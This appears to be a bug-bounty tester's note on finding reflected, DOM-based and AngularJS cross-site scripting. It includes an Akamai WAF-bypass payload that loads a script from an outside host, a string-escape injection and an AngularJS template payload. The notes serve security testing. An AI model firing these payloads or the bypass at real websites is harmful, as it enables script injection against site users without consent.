##### If there is reflected value in the iframe src but akamai blocks it, we can try to bypass it using below payload
````
link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>

````
![Screenshot from 2023-06-16 18-53-58](https://github.com/Sameer484/methodology/assets/110039044/58c56999-42da-4fcb-a447-b11f9e223984)


---
#### Quick tips
- See the reflected value and open inspect element. Search(ctrl+f) for the entered keywords and trace where is it being used.
- If the value is being set to variable , we can escape it and enter javascript
  ````
  var a= "hacked"    //hacked is searched keyword in search bar and it is being assigned here like this.

  we can escape it using
     hacked";alert(2)//
  ````

- If no value are reflected in the response , then test for DOM based XSS. Open DOM Invador and enter the canary value in the search bar or anywhere in the query parameter.
- See if the website is built with Angular js. Now see if the reflected payload is inside the  ng-app directive{\<div ng-app> hacked(this is reflected value)}, use the below payload to trigger xss
  ````
  {{$eval.constructor('alert(1)')()}}
  ````
  ---
 - XSS Basic Payload  ( anything'"<x</   )
